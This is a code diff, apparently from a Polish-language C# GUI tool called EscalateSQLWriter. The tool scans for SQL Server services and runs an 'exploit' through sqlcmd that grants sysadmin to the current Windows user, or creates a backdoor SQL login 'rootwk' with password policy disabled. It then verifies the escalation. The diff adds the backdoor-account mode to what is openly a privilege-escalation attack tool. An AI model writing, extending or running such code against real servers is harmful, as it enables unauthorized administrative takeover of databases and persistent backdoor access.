@@ -61,6 +61,11 @@ namespace EscalateSQLWriter
             txtLog.ScrollToCaret();
         }
 
+        private void rbSqlUser_CheckedChanged(object sender, EventArgs e)
+        {
+            txtPassword.Enabled = rbSqlUser.Checked;
+        }
+
         private void btnScan_Click(object sender, EventArgs e)
         {
             btnScan.Enabled = false;
@@ -69,6 +74,7 @@ namespace EscalateSQLWriter
             btnExploit.Enabled = false;
             _sqlcmdPath = null;
             _originalImagePath = null;
+            grpMode.Enabled = false;
 
             // Run in background to keep UI responsive
             System.Threading.Tasks.Task.Run(() => PerformScan());
@@ -144,7 +150,7 @@ namespace EscalateSQLWriter
                 }));
 
                 Log($"Znaleziono {sqlServices.Count} usług.", Color.Green);
-                Log("Gotowe do ataku. Wybierz usługę i kliknij przycisk.", Color.Cyan);
+                Log("Gotowe do ataku. Wybierz usługę, cel i kliknij przycisk.", Color.Cyan);
             }
             catch (Exception ex)
             {
@@ -152,7 +158,10 @@ namespace EscalateSQLWriter
             }
             finally
             {
-                this.Invoke(new Action(() => btnScan.Enabled = true));
+                this.Invoke(new Action(() => {
+                    btnScan.Enabled = true;
+                    grpMode.Enabled = true;
+                }));
             }
         }
 
@@ -194,14 +203,27 @@ namespace EscalateSQLWriter
             if (cmbServices.SelectedItem == null) return;
             string serviceName = cmbServices.SelectedItem.ToString();
 
+            bool useSqlAuth = rbSqlUser.Checked;
+            string password = txtPassword.Text;
+
+            if (useSqlAuth)
+            {
+                if (string.IsNullOrWhiteSpace(password))
+                {
+                    MessageBox.Show("Podaj hasło dla użytkownika rootwk!", "Błąd", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    return;
+                }
+            }
+
             btnScan.Enabled = false;
             btnExploit.Enabled = false;
             cmbServices.Enabled = false;
+            grpMode.Enabled = false;
 
-            System.Threading.Tasks.Task.Run(() => RunExploit(serviceName));
+            System.Threading.Tasks.Task.Run(() => RunExploit(serviceName, useSqlAuth, password));
         }
 
-        private void RunExploit(string serviceName)
+        private void RunExploit(string serviceName, bool useSqlAuth, string password)
         {
             try
             {
@@ -216,12 +238,26 @@ namespace EscalateSQLWriter
                 }
                 Log($"Cel: {serverInstance}");
 
-                // Current User
-                string currentUser = WindowsIdentity.GetCurrent().Name;
-                Log($"Użytkownik: {currentUser}");
+                string sqlQuery;
 
-                // Payload
-                string sqlQuery = $"IF NOT EXISTS (SELECT name FROM sys.sql_logins WHERE name = N'{currentUser}') BEGIN CREATE LOGIN [{currentUser}] FROM WINDOWS; END; ALTER SERVER ROLE [sysadmin] ADD MEMBER [{currentUser}];";
+                if (useSqlAuth)
+                {
+                    Log("Tryb: Utworzenie użytkownika SQL 'rootwk'");
+                    // Escape single quotes in password for SQL query
+                    string safePass = password.Replace("'", "''");
+
+                    // Logic: Check if login exists. If no -> CREATE, If yes -> ALTER password. Then add to sysadmin.
+                    sqlQuery = $"IF NOT EXISTS (SELECT * FROM sys.sql_logins WHERE name='rootwk') BEGIN CREATE LOGIN [rootwk] WITH PASSWORD=N'{safePass}', CHECK_POLICY=OFF; END ELSE BEGIN ALTER LOGIN [rootwk] WITH PASSWORD=N'{safePass}'; END; ALTER SERVER ROLE [sysadmin] ADD MEMBER [rootwk];";
+                }
+                else
+                {
+                    // Current Windows User
+                    string currentUser = WindowsIdentity.GetCurrent().Name;
+                    Log($"Tryb: Dodanie użytkownika Windows: {currentUser}");
+                    sqlQuery = $"IF NOT EXISTS (SELECT name FROM sys.sql_logins WHERE name = N'{currentUser}') BEGIN CREATE LOGIN [{currentUser}] FROM WINDOWS; END; ALTER SERVER ROLE [sysadmin] ADD MEMBER [{currentUser}];";
+                }
+
+                // Payload construction
                 string escapedQuery = sqlQuery.Replace("\"", "\"\"");
                 string payload = $"\"{_sqlcmdPath}\" -S {serverInstance} -Q \"{escapedQuery}\"";
 
@@ -278,8 +314,24 @@ namespace EscalateSQLWriter
 
                 // Verify
                 Log("Weryfikacja dostępu...", Color.Cyan);
-                string testQuery = "SELECT 'SUKCES: ' + SYSTEM_USER + ' ma sysadmin na ' + @@SERVERNAME";
-                ProcessStartInfo testInfo = new ProcessStartInfo(_sqlcmdPath, $"-S {serverInstance} -E -Q \"{testQuery}\"");
+                string testQuery;
+                string authArgs;
+
+                if (useSqlAuth)
+                {
+                   testQuery = "SELECT 'SUKCES: Użytkownik SQL rootwk ma sysadmin na ' + @@SERVERNAME";
+                   // Use -U and -P for verification
+                   // Escape double quotes in password for CMD argument:
+                   string cmdPass = password.Replace("\"", "\\\"");
+                   authArgs = $"-U rootwk -P \"{cmdPass}\"";
+                }
+                else
+                {
+                   testQuery = "SELECT 'SUKCES: ' + SYSTEM_USER + ' ma sysadmin na ' + @@SERVERNAME";
+                   authArgs = "-E"; // Trusted Connection
+                }
+
+                ProcessStartInfo testInfo = new ProcessStartInfo(_sqlcmdPath, $"-S {serverInstance} {authArgs} -Q \"{testQuery}\"");
                 testInfo.UseShellExecute = false;
                 testInfo.RedirectStandardOutput = true;
                 testInfo.CreateNoWindow = true;
@@ -321,6 +373,7 @@ namespace EscalateSQLWriter
                     btnScan.Enabled = true;
                     btnExploit.Enabled = true;
                     cmbServices.Enabled = true;
+                    grpMode.Enabled = true;
                 }));
             }
         }
